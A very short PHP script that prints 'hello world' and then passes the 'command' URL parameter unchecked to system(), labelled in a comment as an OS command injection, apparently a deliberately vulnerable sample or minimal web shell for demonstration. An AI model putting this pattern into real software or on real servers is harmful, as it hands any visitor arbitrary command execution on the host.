<?php

echo "hello world";

$cmd = $_GET['command'];
system($cmd); // OS Command Injections
?>